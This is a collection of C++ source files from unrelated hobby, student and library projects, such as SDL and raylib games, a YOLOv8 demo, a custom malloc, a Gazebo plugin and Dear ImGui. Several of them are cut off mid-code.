(eventData.type == SDL_QUIT)\r\n            {\r\n                running = false;\r\n                break;\r\n            }\r\n            if (eventData.type == SDL_MOUSEBUTTONUP) {\r\n                if (eventData.button.state == SDL_RELEASED) {\r\n                    rend.removeObject(\"nullID\");\r\n                }\r\n            }\r\n        }\r\n        rend.renderObject();\r\n\r\n        physicsCalc.calculateTrajectory(temp1, 1./FPS);\r\n        std::pair<int,int> temp = {temp1->position.getX(), temp1->position.getY()};\r\n        temp1->setPoistionXY(temp);\r\n        \r\n        frameTime = SDL_GetTicks() - frameStart;\r\n\r\n        if (frameDelay > frameTime) {\r\n            SDL_Delay(frameDelay - frameTime);\r\n        }\r\n\r\n        frameCount++;\r\n\r\n        Uint32 currentTime = SDL_GetTicks();\r\n        if (currentTime - lastTime >= 1000) {\r\n            std::cout << \"FPS: \" << frameCount << std::endl;\r\n            frameCount = 0;\r\n            lastTime = currentTime;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <string>\n\nstruct Bier {\n    std::string name;\n    double preis;\n    Bier *next;\n} *head, *tail, *runner;\n\nvoid initQ() {\n    head = new Bier;\n    tail = new Bier;\n\n    head->preis = 0;\n    head->name = \"\";\n\n    tail->preis = 0;\n    tail->name = \"\";\n\n    head->next = tail;\n\n    runner = head;\n}\n\nvoid enQ(const std::string &name, const double &preis) {\n    Bier *b = new Bier;\n\n    b->name = name;\n    b->preis = preis;\n\n    b->next = tail;\n    runner->next = b;\n\n    runner = b;\n}\n\nint deQ() {\n    if (head->next == tail) return 1;\n\n    const Bier *b = head->next;\n    head->next = b->next;\n\n    delete b;\n\n    return 0;\n}\n\nBier first() { return *head->next; }\n\nvoid deleteQ() {\n    Bier *runner = head;\n    while (runner->next != NULL) {\n        Bier *tmp = runner;\n        runner = tmp->next;\n\n        delete tmp;\n    }\n}\n\nbool isEmpty() { return head->next == tail; }\n\nvoid showQ() {\n    Bier *runner = head;\n    while (runner->next != NULL) {\n        if (runner != head && runner != tail) std::cout << runner->name << \" - \" << runner->preis << \"\\n\";\n        runner = runner->next;\n    }\n}\n\nint main() {\n    initQ();\n\n    enQ(\"A\", 1.5);\n    showQ();\n    std::cout << \"\\n\";\n\n    enQ(\"B\", 0.5);\n    showQ();\n    std::cout << \"\\n\";\n\n    enQ(\"C\", 2.0);\n    showQ();\n    std::cout << \"\\n\";\n\n    deQ();\n    showQ();\n    std::cout << \"\\n\";\n\n    deleteQ();\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"simple_calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n\r\nint main() {\r\n  // Your future is here\r\n  std::cout << \"MAGIC 8-BALL \\n\";\r\n\r\n  // Declaring variable\r\n  srand(time(NULL));\r\n  int answer = std::rand() % 10;\r\n\r\n  // Connecting fortune to numbers generated\r\n  if (answer == 0) {\r\n    std::cout << \"It is certain\";\r\n  }\r\n  else if (answer == 1) {\r\n    std::cout << \"You will get lucky tomorrow\";\r\n  }\r\n  else if (answer == 2) {\r\n    std::cout << \"Your pants will not dry today\";\r\n  }\r\n  else if (answer == 3) {\r\n    std::cout << \"Prepare to get your shoes dipped in poop\";\r\n  }\r\n  else if (answer == 4) {\r\n    std::cout << \"You will have issues with your keyboard\";\r\n  }\r\n  else if (answer == 5) {\r\n    std::cout << \"A celebrity will come pass around you\";\r\n  }\r\n  else if (answer == 6) {\r\n    std::cout << \"It will rain tomorrow\";\r\n  }\r\n  else if (answer == 7) {\r\n    std::cout << \"Your hands will sweat for no reason\";\r\n  }\r\n  else if (answer == 8) {\r\n    std::cout << \"You will smell good without taking a bath today\";\r\n  }\r\n  else if (answer == 9) {\r\n    std::cout << \"Money will find you\";\r\n  }\r\n  else {\r\n    std::cout << \"Very doubtful\";\r\n  }\r\n}",
    "//\n// Created by ubuntu on 1/20/23.\n//\n#include \"opencv2/opencv.hpp\"\n#include \"yolov8.hpp\"\n#include <chrono>\n\nnamespace fs = ghc::filesystem;\n\nconst std::vector<std::string> CLASS_NAMES = {\n    \"person\",         \"bicycle\",    \"car\",           \"motorcycle\",    \"airplane\",     \"bus\",           \"train\",\n    \"truck\",          \"boat\",       \"traffic light\", \"fire hydrant\",  \"stop sign\",    \"parking meter\", \"bench\",\n    \"bird\",           \"cat\",        \"dog\",           \"horse\",         \"sheep\",        \"cow\",           \"elephant\",\n    \"bear\",           \"zebra\",      \"giraffe\",       \"backpack\",      \"umbrella\",     \"handbag\",       \"tie\",\n    \"suitcase\",       \"frisbee\",    \"skis\",          \"snowboard\",     \"sports ball\",  \"kite\",          \"baseball bat\",\n    \"baseball glove\", \"skateboard\", \"surfboard\",     \"tennis racket\", \"bottle\",       \"wine glass\",    \"cup\",\n    \"fork\",           \"knife\",      \"spoon\",         \"bowl\",          \"banana\",       \"apple\",         \"sandwich\",\n    \"orange\",         \"broccoli\",   \"carrot\",        \"hot dog\",       \"pizza\",        \"donut\",         \"cake\",\n    \"chair\",          \"couch\",      \"potted plant\",  \"bed\",           \"dining table\", \"toilet\",        \"tv\",\n    \"laptop\",         \"mouse\",      \"remote\",        \"keyboard\",      \"cell phone\",   \"microwave\",     \"oven\",\n    \"toaster\",        \"sink\",       \"refrigerator\",  \"book\",          \"clock\",        \"vase\",          \"scissors\",\n    \"teddy bear\",     \"hair drier\", \"toothbrush\"};\n\nconst std::vector<std::vector<unsigned int>> COLORS = {\n    {0, 114, 189},   {217, 83, 25},   {237, 177, 32},  {126, 47, 142},  {119, 172, 48},  {77, 190, 238},\n    {162, 20, 47},   {76, 76, 76},    {153, 153, 153}, {255, 0, 0},     {255, 128, 0},   {191, 191, 0},\n    {0, 255, 0},     {0, 0, 255},     {170, 0, 255},   {85, 85, 0},     {85, 170, 0},    {85, 255, 0},\n    {170, 85, 0},    {170, 170, 0},   {170, 255, 0},   {255, 85, 0},    {255, 170, 0},   {255, 255, 0},\n    {0, 85, 128},    {0, 170, 128},   {0, 255, 128},   {85, 0, 128},    {85, 85, 128},   {85, 170, 128},\n    {85, 255, 128},  {170, 0, 128},   {170, 85, 128},  {170, 170, 128}, {170, 255, 128}, {255, 0, 128},\n    {255, 85, 128},  {255, 170, 128}, {255, 255, 128}, {0, 85, 255},    {0, 170, 255},   {0, 255, 255},\n    {85, 0, 255},    {85, 85, 255},   {85, 170, 255},  {85, 255, 255},  {170, 0, 255},   {170, 85, 255},\n    {170, 170, 255}, {170, 255, 255}, {255, 0, 255},   {255, 85, 255},  {255, 170, 255}, {85, 0, 0},\n    {128, 0, 0},     {170, 0, 0},     {212, 0, 0},     {255, 0, 0},     {0, 43, 0},      {0, 85, 0},\n    {0, 128, 0},     {0, 170, 0},     {0, 212, 0},     {0, 255, 0},     {0, 0, 43},      {0, 0, 85},\n    {0, 0, 128},     {0, 0, 170},     {0, 0, 212},     {0, 0, 255},     {0, 0, 0},       {36, 36, 36},\n    {73, 73, 73},    {109, 109, 109}, {146, 146, 146}, {182, 182, 182}, {219, 219, 219}, {0, 114, 189},\n    {80, 183, 189},  {128, 128, 0}};\n\nint main(int argc, char** argv)\n{\n    if (argc != 3) {\n        fprintf(stderr, \"Usage: %s [engine_path] [image_path/image_dir/video_path]\\n\", argv[0]);\n        return -1;\n    }\n\n    // cuda:0\n    cudaSetDevice(0);\n\n    const std::string engine_file_path{argv[1]};\n    const fs::path    path{argv[2]};\n\n    std::vector<std::string> imagePathList;\n    bool                     isVideo{false};\n\n    auto yolov8 = new YOLOv8(engine_file_path);\n    yolov8->make_pipe(true);\n\n    if (fs::exists(path)) {\n        std::string suffix = path.extension();\n        if (suffix == \".jpg\" || suffix == \".jpeg\" || suffix == \".png\") {\n            imagePathList.push_back(path);\n        }\n        else if (suffix == \".mp4\" || suffix == \".avi\" || suffix == \".m4v\" || suffix == \".mpeg\" || suffix == \".mov\"\n                 || suffix == \".mkv\") {\n            isVideo = true;\n        }\n        else {\n            printf(\"suffix %s is wrong !!!\\n\", suffix.c_str());\n            std::abort();\n        }\n    }\n    else if (fs::is_directory(path)) {\n        cv::glob(path.string() + \"/*.jpg\", imagePathList);\n    }\n\n    cv::Mat             res, image;\n    cv::Size            size = cv::Size{640, 640};\n    std::vector<Object> objs;\n\n    cv::namedWindow(\"result\", cv::WINDOW_AUTOSIZE);\n\n    if (isVideo) {\n        cv::VideoCapture cap(path);\n\n        if (!cap.isOpened()) {\n            printf(\"can not open %s\\n\", path.c_str());\n            return -1;\n        }\n        while (cap.read(image)) {\n            objs.clear();\n            yolov8->copy_from_Mat(image, size);\n            auto start = std::chrono::system_clock::now();\n            yolov8->infer();\n            auto end = std::chrono::system_clock::now();\n            yolov8->postprocess(objs);\n            yolov8->draw_objects(image, res, objs, CLASS_NAMES, COLORS);\n            auto tc = (double)std::chrono::duration_cast<std::chrono::microseconds>(end - start).count() / 1000.;\n            printf(\"cost %2.4lf ms\\n\", tc);\n            cv::imshow(\"result\", res);\n            if (cv::waitKey(10) == 'q') {\n                break;\n            }\n    ",
    "#include <unistd.h>\n#include <cstring>\n#define SBRK_FAILED (void *) (-1)\n#define MAX_SIZE 100000000\n#define META_DATA_SIZE sizeof(MallocMetadata)\n#define GET_METADATA(p) ((MallocMetadata *) ((char *) p - META_DATA_SIZE))\n#define GET_USER_PTR(p) ((void*)((char*)(p) + META_DATA_SIZE))\n#define ALLOC_SIZE(s) long(s + META_DATA_SIZE)\n\nclass MallocMetadata\n{\nprivate:\n    size_t user_size;\n    bool is_free;\n    MallocMetadata* next;\n    MallocMetadata* prev;\npublic:\n    explicit MallocMetadata(size_t user_size);\n    ~MallocMetadata() = default;\n    size_t getUserSize() const;\n    void setNext(MallocMetadata* new_next);\n    MallocMetadata* getNext();\n    void setPrev(MallocMetadata* new_prev);\n    void setIsFree(bool new_is_free);\n    bool isFree() const;\n};\n\nMallocMetadata::MallocMetadata(size_t user_size): user_size(user_size), is_free(false),\n                                                  next(nullptr), prev(nullptr) {}\n\nsize_t MallocMetadata::getUserSize() const {\n    return this->user_size;\n}\n\nvoid MallocMetadata::setNext(MallocMetadata *new_next) {\n    this->next = new_next;\n}\n\nMallocMetadata *MallocMetadata::getNext() {\n    return this->next;\n}\n\nvoid MallocMetadata::setPrev(MallocMetadata *new_prev) {\n    this->prev = new_prev;\n}\n\nvoid MallocMetadata::setIsFree(bool new_is_free) {\n    this->is_free = new_is_free;\n}\n\nbool MallocMetadata::isFree() const {\n    return this->is_free;\n}\n\nclass MemoryManager\n{\nprivate:\n    MallocMetadata* head;\n    MallocMetadata* tail;\n    size_t num_of_allocated_blocks; // = num_of_meta_data_blocks\n    size_t num_of_bytes_in_allocated_blocks;\n    size_t num_of_allocated_blocks_that_are_free;\n    size_t num_of_bytes_in_allocated_blocks_that_are_free;\n\npublic:\n    MemoryManager();\n    ~MemoryManager() =default;\n    void setHead(MallocMetadata* new_head);\n    MallocMetadata* getHead();\n    void setTail(MallocMetadata* new_tail);\n    MallocMetadata* getTail();\n    size_t getNumOfAllocatedBlocks() const;\n    void incNumOfAllocatedBlocks();\n    size_t getNumOfBytesInAllocatedBlocks() const;\n    void incNumOfBytesInAllocatedBlocksBy(size_t num_of_bytes);\n    size_t getNumOfAllocatedBlocksThatAreFree() const;\n    void incNumOfAllocatedBlocksThatAreFree();\n    void decNumOfAllocatedBlocksThatAreFree();\n    size_t getNumOfBytesInAllocatedBlocksThatAreFree() const;\n    void incNumOfBytesInAllocatedBlocksThatAreFreeBy(size_t num_of_bytes);\n    void decNumOfBytesInAllocatedBlocksThatAreFreeBy(size_t num_of_bytes);\n};\n\nMemoryManager::MemoryManager(): head(nullptr), tail(nullptr), num_of_allocated_blocks(0),\n        num_of_bytes_in_allocated_blocks(0), num_of_allocated_blocks_that_are_free(0),\n                                num_of_bytes_in_allocated_blocks_that_are_free(0) {}\n\nMallocMetadata *MemoryManager::getHead() {\n    return this->head;\n}\n\nvoid MemoryManager::setTail(MallocMetadata *new_tail) {\n    this->tail = new_tail;\n}\n\nMallocMetadata *MemoryManager::getTail() {\n    return this->tail;\n}\n\nvoid MemoryManager::setHead(MallocMetadata *new_head) {\n    this->head = new_head;\n}\n\nsize_t MemoryManager::getNumOfAllocatedBlocks() const {\n    return this->num_of_allocated_blocks;\n}\n\nvoid MemoryManager::incNumOfAllocatedBlocks()\n{\n    this->num_of_allocated_blocks++;\n}\n\nsize_t MemoryManager::getNumOfBytesInAllocatedBlocks() const {\n    return num_of_bytes_in_allocated_blocks;\n}\n\nvoid MemoryManager::incNumOfBytesInAllocatedBlocksBy(size_t num_of_bytes) {\n    this->num_of_bytes_in_allocated_blocks += num_of_bytes;\n}\n\nsize_t MemoryManager::getNumOfAllocatedBlocksThatAreFree() const {\n    return this->num_of_allocated_blocks_that_are_free;\n}\n\nvoid MemoryManager::incNumOfAllocatedBlocksThatAreFree() {\n    this->num_of_allocated_blocks_that_are_free++;\n}\n\nvoid MemoryManager::decNumOfAllocatedBlocksThatAreFree() {\n    this->num_of_allocated_blocks_that_are_free--;\n}\n\nsize_t MemoryManager::getNumOfBytesInAllocatedBlocksThatAreFree() const {\n    return num_of_bytes_in_allocated_blocks_that_are_free;\n}\n\nvoid MemoryManager::incNumOfBytesInAllocatedBlocksThatAreFreeBy(size_t num_of_bytes) {\n    this->num_of_bytes_in_allocated_blocks_that_are_free += num_of_bytes;\n}\n\nvoid MemoryManager::decNumOfBytesInAllocatedBlocksThatAreFreeBy(size_t num_of_bytes) {\n    this->num_of_bytes_in_allocated_blocks_that_are_free -= num_of_bytes;\n}\n\n\nMemoryManager manager = MemoryManager();\n\n\nMallocMetadata* lookForAvailableBlock(size_t user_size)\n{\n    MallocMetadata* itr = manager.getHead();\n    while(itr != nullptr)\n    {\n        if(itr->getUserSize() >= user_size && itr->isFree())\n        {\n            return itr;\n        }\n        itr = itr->getNext();\n    }\n    return itr;\n}\n\nvoid* smalloc(size_t size)\n{\n    if (size == 0 || size > MAX_SIZE)\n    {\n        return NULL; //need to return NULL or nullptr?\n    }\n\n    MallocMetadata* block_to_use = lookForAvailableBlock(size);\n    if(block_to_use == nullptr)\n    {\n        block_to_use = (MallocMetadata*) (sbrk(ALLOC_SIZE(size)));\n        if(block_to_use == SBRK_FAILED)\n        {",
    "#include<iostream>\n#include<raylib.h>\n\nusing namespace std;\n\n\n\nColor Green = Color{38,185,154,255};\nColor Dark_Green = Color{20,160,133,255};\nColor Light_Green = Color{129,204,184,255};\nColor Yellow = Color{243,213,91,255};\n\nint playerScore = 0 , cpuScore = 0;\n\nclass Ball{\n        public:\n        float x,y;\n        int radius;\n        int speedX,speedY;\n       \n    void Draw(){                                                                 //drawing the ball ( moving motion and stuffs )\n         DrawCircle(x, y,radius, Yellow );         //making the ball\n    }\n\n    void Update(){\n        x += speedX; //they increase the x and y direction of the ball by 7 pixels , 7 bcuz tala ball.speedx\n        y += speedY;\n\n        if ( y + radius >= GetScreenHeight() || y - radius <= 0){ // the ball doesnt go out of the screen but rebounds inside the window \n            speedY *= -1;\n        }\n        if(x+radius >= GetScreenWidth()) //cpu wins\n        {\n            cpuScore++;\n            ResetBall();\n        }\n        if(x-radius <= 0)\n        {\n            playerScore++;\n            ResetBall();\n        }\n    }\n\n    void ResetBall()\n    {\n        x = GetScreenWidth()/2;\n        y = GetScreenHeight()/2;\n\n        int speed_choices[2] = {-1,1};\n        speedX *= speed_choices[GetRandomValue(0,1)];\n        speedY *= speed_choices[GetRandomValue(0,1)];\n    }\n};\n\nclass Paddle{\n    protected: // yo tala chai , the code makes the paddle not to go out of the game window \n        void LimitMovement() \n        {\n             if(y <= 0){\n            y=0;\n        }\n        if(y + height >= GetScreenHeight())\n        {\n            y = GetScreenHeight() - height;\n        }\n        }\n    public:\n    float x,y;\n    float width,height;\n    int speed;\n\n    void Draw(){\n         DrawRectangleRounded(Rectangle{x,y,width,height},0.8, 0, WHITE);   //making paddle  , right side wala ( we control this )\n    }\n    void Update(){  // moving the paddle \n        if(IsKeyDown(KEY_UP)){\n            y = y-speed;\n        }\n        if(IsKeyDown(KEY_DOWN)){\n            y = y+speed;\n        }\n        // yo tala chai , the code makes the paddle not to go out of the game window \n        LimitMovement();\n    }\n};\n\nclass CpuPaddle : public Paddle{  //inheritance use garera ball ra cpu bich aafai move garako\n    public:\n\n    void Update(int ball_y){\n        if(y+height/2 > ball_y)\n        {\n            y = y - speed;\n        }\n        if(y + height/2 <= ball_y){\n            y = y + speed;\n        }\n        LimitMovement();\n    }\n\n};\n\nBall ball;\nPaddle player;\nCpuPaddle cpu;\n\nint main(){\n    \n\n    cout<<\"Starting the Game\"<<endl;\n\n    const int screen_width= 1280;                                       //making the resolution for the game\n    const int screen_height= 800;\n   \n\n    InitWindow(screen_width,screen_height,\"My Pong Gamee !\");\n\n    SetTargetFPS(60);                                                   //frame per sec matching for all computer resolution \n    \n    //moves the ball\n    ball.radius = 20;\n    ball.x = screen_width/2;\n    ball.y = screen_height/2;\n    ball.speedX = 7;\n    ball.speedY = 7;\n\n    //player paddle \n    player.width = 25;\n    player.height = 120;\n    player.x = screen_width - player.width -10;\n    player.y = screen_height/2 - player.height/2;\n    player.speed = 6;\n\n    //cpu paddle\n    cpu.height = 120;\n    cpu.width = 25;\n    cpu.x = 10;\n    cpu.y = screen_height/2 - cpu.height/2;\n    cpu.speed = 6;\n\n    while (WindowShouldClose()==false)                                 //gameloop window\n    {\n        BeginDrawing();                                         //starts the window and everything is displayed here \n\n        //updating\n        ball.Update();\n        player.Update();\n        cpu.Update(ball.y);\n\n        //checking for collisions\n        if(CheckCollisionCircleRec(Vector2{ball.x,ball.y},ball.radius,Rectangle{player.x,player.y,player.width,player.height}))\n        {\n            ball.speedX *= -1;\n        }\n        if(CheckCollisionCircleRec(Vector2{ball.x,ball.y},ball.radius,Rectangle{cpu.x,cpu.y,cpu.width,cpu.height}))\n        {\n            ball.speedX *= -1;\n        }\n\n        //drawing\n        ClearBackground(Dark_Green);\n        DrawRectangle(screen_width/2,0,screen_width/2,screen_height,Green);\n        DrawLine(screen_width/2,0,screen_width/2, screen_height,WHITE); \n        DrawCircle(screen_width/2,screen_height/2,150,Light_Green);\n        ball.Draw();\n        cpu.Draw();\n        player.Draw();\n        DrawText(TextFormat(\"%i\",cpuScore), screen_width/4 - 20,20,80,WHITE);  // displaying scores\n        DrawText(TextFormat(\"%i\",playerScore), 3 * screen_width/4 - 20,20,80,WHITE);\n\n        EndDrawing();                                                          //ends the window and everything gets destroyed here \n    }\n    \n\n    CloseWindow();\n}\n",
    "#include <gazebo/gazebo.hh>\n#include <gazebo/physics/physics.hh>\n#include <gazebo/common/common.hh>\n\n//based on examples from https://github.com/srmainwaring\n\nnamespace gazebo\n{\n    // Derived from the ModelPlugin class\n    class MagneticField : public ModelPlugin\n    {\n    public:\n        // load function - for when the plugin is inserted into the simulation\n        void Load(physics::ModelPtr _model, sdf::ElementPtr /*_sdf*/)\n        {\n            // set a magnetic field vector\n            ignition::math::Vector3d magneticField(0, 0, 0.00005); //TODO changeme later\n            this->model = _model;\n            // connect to the world update event\n            this->updateConnection = event::Events::ConnectWorldUpdateBegin(\n                    std::bind(&MagneticFieldPlugin::OnUpdate, this));\n        }\n\n        // called on every timestep (?)\n        void OnUpdate()\n        {\n            // calc the magnetic force based on the model's position\n            ignition::math::Vector3d force = magneticField * this->model->WorldPose().Pos(); \n            // apply the force to the model\n            this->model->GetLink()->AddForce(force);\n        }\n\n    private:\n        physics::ModelPtr model; // Pointer to the model\n        event::ConnectionPtr updateConnection; // Pointer to the update event connection\n        ignition::math::Vector3d magneticField; // Magnetic field vector\n    };\n    \n    GZ_REGISTER_MODEL_PLUGIN(MagneticFieldPlugin)\n}\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Node {\n    int src;\n    int dest;\n    Node* next;\n\n    Node(int srcVal, int destVal) : src(srcVal), dest(destVal), next(NULL) {}\n};\n\nconst int adjSize = 6;\nNode* adjList[adjSize];\nvoid showAdjList();\nvoid addEdge();\nvoid insertAdj(int src, int dest, Node*& head, Node*& tail);\nbool isSelfLoop(int src, int dest);\n\nint main() {\n    int choose;\n\n    for (int i = 0; i < adjSize; i++) {\n        adjList[i] = NULL;\n    }\n\n    do {\n        cout << \"========MENU======\\n\"\n             << \"1) Input adjacency list\\n\"\n             << \"2) Show self loop from adjacency list\\n\"\n             << \"3) Exit\\n\";\n        cout << \"Please choose > \";\n        cin >> choose;\n\n        switch (choose) {\n            case 1:\n                addEdge();\n                showAdjList();\n                break;\n\n            case 2:\n                for (int i = 0; i < adjSize; i++) {\n                    Node* p = adjList[i];\n                    while (p != NULL) {\n                        if (isSelfLoop(p->src, p->dest)) {\n                            cout << \"Self loop: \" << p->src << endl;\n                            break;\n                        }\n                        p = p->next;\n                    }\n                }\n                break;\n\n            case 3:\n                cout << \"End!!\";\n                break;\n        }\n        cout << endl;\n\n    } while (choose != 3);\n\n    return 0;\n}\n\nvoid addEdge() {\n    int dest;\n\n    for (int src = 0; src < adjSize; src++) {\n        Node* tail;\n        cout << \"Enter # \" << src << \" : \";\n        cin >> dest;\n\n        Node* head = NULL;\n        tail = NULL;\n\n        while (dest != -1) {\n            insertAdj(src, dest, head, tail);\n            cin >> dest;\n        }\n\n        adjList[src] = head;\n    }\n}\n\nvoid insertAdj(int src, int dest, Node*& head, Node*& tail) {\n    Node* newNode = new Node(src, dest);\n\n    if (head == NULL) {\n        head = newNode;\n        tail = newNode;\n    } else {\n        tail->next = newNode;\n        tail = newNode;\n    }\n}\n\nvoid showAdjList() {\n    for (int i = 0; i < adjSize; i++) {\n        Node* p = adjList[i];\n        if (p != NULL) {\n            cout << \"#\" << p->src << \": \";\n            while (p != NULL) {\n                cout << p->dest << \" \";\n                p = p->next;\n            }\n            cout << endl;\n        }\n    }\n}\n\nbool isSelfLoop(int src, int dest) {\n    return src == dest;\n}\n",
    "// dear imgui, v1.91.2 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImTriangulator, ImDrawList concave polygon fill\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wreserved-identifier\"            // warning: identifier '_Xxx' is reserved because it starts with '_' followed by a capital letter\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warning: stack protector not protecting local variables: variable length buffer\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n/",
    "\ufeff#include \"include/framework.h\"\n#include \"include/window.h\"\n#include \"include/window_handler.h\"\n#include \"include/Structs.h\"\n#include \"include/Settings.h\"\n#include \"include/common.h\"\n#include \"include/HdcScoped.h\"\n\n//--------------------------\n\nLAB::Settings g_settings {};\n\n//--------------------------\n\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance,\n                     _In_opt_ HINSTANCE hPrevInstance,\n                     _In_ LPWSTR    lpCmdLine,\n                     _In_ int       nCmdShow)\n{\n    try\n    {\n        if (g_settings.isInit() == false) [[unlikely]]\n        {\n            std::wcerr << L\"Can not init App!\\n\";\n            return 1;\n        }\n\n        auto winfo_opt { g_settings.getWindowInfo() };\n\n        if (winfo_opt.has_value() == false) [[unlikely]]\n        {\n            std::wcerr << L\"winfo_opt.has_value() == false\\n\";\n            return 2;\n        }\n\n        LAB::Window window { \n            hInstance,\n            hPrevInstance,\n            lpCmdLine,\n            nCmdShow,\n            LAB::WindowHandler::WndProc, // callback wnd_proc\n            winfo_opt.value().get().pos_x, // start_pos_x\n            winfo_opt.value().get().pos_y, // start_pos_y\n            winfo_opt.value().get().width, // width\n            winfo_opt.value().get().height, // height\n        };\n\n        window.loop();\n    }\n    catch (const std::exception& ex)\n    {\n        std::wcerr << L\"Exception: \" << ex.what() << \"\\n\";\n        return 1;\n    }\n\n    return 0;\n}",
    "\ufeff#include \"Game.h\"\n#include \"Player.h\"\n#include \"Hand.h\"\n#include <iostream>\n#include <cstdlib>\n#include <conio.h>\n#include <iomanip>\n#include <windows.h>\n\n\nGame::Game(int players) : playerCount(players) {}\n\n\n\nint gameState = 0;\nbool gameEnded = false;\n\n// Set Colors --------------------------------------------------\nvoid Game::setColor(int color) {\n    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);\n}\n// -------------------------------------------------------------\n\n\n\n// Player functions--------------------------------------------\nvoid Game::addPlayer() {\n    if (players.size() < MAX_PLAYERS) {\n        std::cout << \"Adding player \" << players.size() +1 << \" \\n\";\n        Player player(static_cast<int>(players.size()+1));\n        players.push_back(player);\n    }\n    else std::cout << \"Full room!\" << std::endl;\n}\n\nvoid Game::delPlayer(int id) {\n    players.erase(players.begin() + id);\n}\n\nvoid Game::clearPlayers() { players.clear(); }\n// 